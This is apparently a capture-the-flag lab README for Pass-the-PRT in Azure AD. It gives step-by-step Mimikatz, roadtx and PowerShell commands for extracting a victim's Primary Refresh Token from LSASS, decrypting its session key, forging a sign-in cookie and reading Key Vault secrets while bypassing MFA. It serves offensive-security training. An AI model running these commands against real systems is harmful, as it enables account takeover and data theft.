# pass_the_prt — Pass-the-PRT: Lateral Movement to the Cloud

**Difficulty:** Advanced  
**Category:** Identity / PRT Abuse / MFA Bypass

## Scenario

A Windows Server VM is Azure AD-joined. A corporate user (`ptp-victim-*`) routinely signs in to this workstation with their Azure AD credentials, which causes Windows to cache a **Primary Refresh Token (PRT)** in LSASS. The PRT is a long-lived SSO credential — equivalent to a Kerberos TGT for the cloud — that Azure AD accepts to issue tokens for any Microsoft resource, including the Key Vault where the flag lives.

You have compromised the machine and hold local admin rights. The victim user has already logged on (step 1 below simulates this). Your goal is to extract the PRT, craft a forged cookie, and authenticate to Azure as the victim — completely bypassing any MFA requirements, since the PRT already encodes a satisfied device-compliance claim.

## Background: what is a PRT?

A PRT is issued by Azure AD's CloudAP (Cloud Authentication Provider) plugin when a user signs in on an Azure AD-joined device. It is stored in LSASS alongside an encrypted **ProofOfPossession (PoP) key** (session key protected by the device's DPAPI/TPM). Together they allow the device to mint short-lived browser cookies and access tokens without prompting the user for credentials again.

Because the PRT embeds the device identity, it bypasses conditional access policies that require MFA or a compliant device. An attacker who extracts it can replay it from any machine.

## Prerequisites

> ⚠️ **Security Defaults must be disabled** in your Entra ID tenant before deploying this lab. Security Defaults enforce MFA on Azure Management (ARM), which blocks subscription enumeration even with a valid PRT.
>
> **Azure portal → Entra ID → Properties → Manage security defaults → Disabled**

## Deploy

```shell
cnimbus azure create --app-id pass_the_prt
```

## Attack Walkthrough

> **Note:** Wait ~10 minutes after `cnimbus azure create` completes. The deployment schedules a reboot that triggers an autologon session as the victim Azure AD user — this seeds their PRT into LSASS. `dsregcmd /status` in your RDP session will show `AzureAdPrt: NO` (it only reflects the current local user); use Mimikatz `sekurlsa::cloudap` to see the victim's entry.

### Step 1 — Connect as the local admin (attacker)

```shell
xfreerdp3 /v:<vm_public_ip> /u:attacker /p:<attacker_password> /d:. /cert:ignore
```

### Step 2 — Extract the PRT from LSASS

Open a command prompt **as Administrator** and launch Mimikatz:

```
C:\Tools\mimikatz\x64\mimikatz.exe
```

```
privilege::debug
sekurlsa::cloudap
```

You will see a credential entry for the victim Azure AD user. Copy two values:
- **PRT** — the base64-encoded token
- **ProofOfPossessionKey** — the encrypted session key blob

> `dsregcmd /status` shows `AzureAdPrt: NO` because it reflects the current (local admin) session, not LSASS contents. Ignore it.

### Step 3 — Decrypt the session key

Still in Mimikatz, elevate to SYSTEM context to access the machine's DPAPI master key, then decrypt:

```
token::elevate
dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect
```

The output shows **three values** — copy all of them:
- **Context** — the nonce embedded in the key blob
- **Clear key** — the raw DPAPI-decrypted session key (used by roadtx)
- **Derived Key** — `HMAC-SHA256(Clear key, Context)` (used by Mimikatz cookie generation)

> **Important:** `Clear key` and `Derived Key` are different. roadtx expects the **Clear key**. Passing the Derived Key to roadtx causes authentication to fail (AADSTS500061).

### Step 4 — Authenticate as the victim (roadtx — recommended)

On your attacking machine, use [roadtx](https://github.com/dirkjanm/ROADtools) with the **Clear key**.

#### 4a — Enumerate the subscription to discover resources

An attacker does not know the Key Vault name upfront. Get an ARM token first and enumerate:

```shell
roadtx prtauth \
  --prt <PRT> \
  --prt-sessionkey <Clear_key> \
  --resource https://management.azure.com/
```

Load the token into Azure PowerShell and list all Key Vaults the victim can access:

```powershell
$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
Get-AzKeyVault
```

> `Connect-AzAccount -AccessToken` lets you inject any Bearer token directly into the Az PowerShell session — no interactive login needed.

#### 4b — Read the flag from Key Vault

Get a Key Vault-scoped token and read the secret:

```shell
roadtx prtauth \
  --prt <PRT> \
  --prt-sessionkey <Clear_key> \
  --resource https://vault.azure.net/
```

```powershell
$kvToken = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
$headers = @{ Authorization = "Bearer $kvToken" }
(Invoke-RestMethod -Uri "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" -Headers $headers).value
```

Or with curl:

```shell
TOKEN=$(python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" \
  | python3 -m json.tool
```

### Step 5 — Authenticate as the victim (browser cookie — alternative)

Generate a signed PRT cookie using Mimikatz (uses the **Derived Key**):

```
dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>
```

The output ends with `Signature with key:` — copy that full value. **Use it immediately** (the nonce expires in ~1 minute).

On **any machine**, open Microsoft Edge or Chrome in **private/incognito** mode:

1. Navigate to `https://login.microsoftonline.com`
2. Open Developer Tools (`F12`) → **Application** → **Cookies** → `https://login.microsoftonline.com` → delete all cookies
3. Add a new cookie:

| Field    | Value                             |
|----------|-----------------------------------|
| Name     | `x-ms-RefreshTokenCredential`     |
| Value    | `<paste the signed cookie value>` |
| Domain   | `login.microsoftonline.com`       |
| Path     | `/`                               |
| HttpOnly | ✓                                 |
| Secure   | ✓                                 |

4. In the address bar type `https://login.microsoftonline.com` and press Enter (do not just press F5)
5. Enter the victim's UPN (`ptp-victim-XXXX@yourdomain.onmicrosoft.com`) — Azure AD reads the cookie during the credential phase and signs you in with **no password or MFA prompt**

### Step 6 — Read the flag from Key Vault

Via the Azure portal (authenticated as victim in browser):

1. Navigate to **Key Vaults** → `<keyvault_name>`
2. **Secrets** → `flag` → click the version → **Show Secret Value**

Or with PowerShell using an ARM token from roadtx:

```powershell
$token = (python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
Connect-AzAccount -AccessToken $token -AccountId <victim_upn>
Get-AzKeyVaultSecret -VaultName <keyvault_name> -Name flag -AsPlainText
```

### Step 7 — Submit the flag

```shell
cnimbus azure validate --app-id pass_the_prt --flag "CUMULONIMBUS{...}"
```

## Why MFA does not help

The PRT encodes the device claim (`DeviceId`, `TrustType: AzureAD`). Azure AD's token issuance engine treats a valid PRT cookie as proof that the user already satisfied MFA on a compliant device. Conditional access policies requiring MFA **or** compliant device are therefore silently bypassed.

### Lab vs real world — MFA claims

In this lab the victim authenticates via automated autologon (password only), so the PRT carries `amr: ["pwd"]` with no MFA claim. This is why **Security Defaults blocks ARM access** — it checks for the `mfa` amr specifically, and the device claim does not satisfy it.

In a real corporate environment users authenticate interactively with MFA every day. Their PRT carries `amr: ["pwd", "mfa"]`. An attacker who steals that PRT inherits the MFA claim and can access **any** resource — including those protected by strict MFA-only policies — with no MFA prompt. This is the true power of the technique.

The lab demonstrates the device-claim bypass (CA policies requiring compliant device). To avoid the Security Defaults limitation, disable Security Defaults and use a Conditional Access policy with "MFA or compliant device" — the Azure AD-joined device satisfies the compliant device branch without needing an MFA claim in the PRT.

## Teardown

```shell
cnimbus azure destroy --app-id pass_the_prt
```

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1550.001](https://attack.mitre.org/techniques/T1550/001/) | Use Alternate Authentication Material: Application Access Token | Defense Evasion |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
| [T1528](https://attack.mitre.org/techniques/T1528/) | Steal Application Access Token | Credential Access |
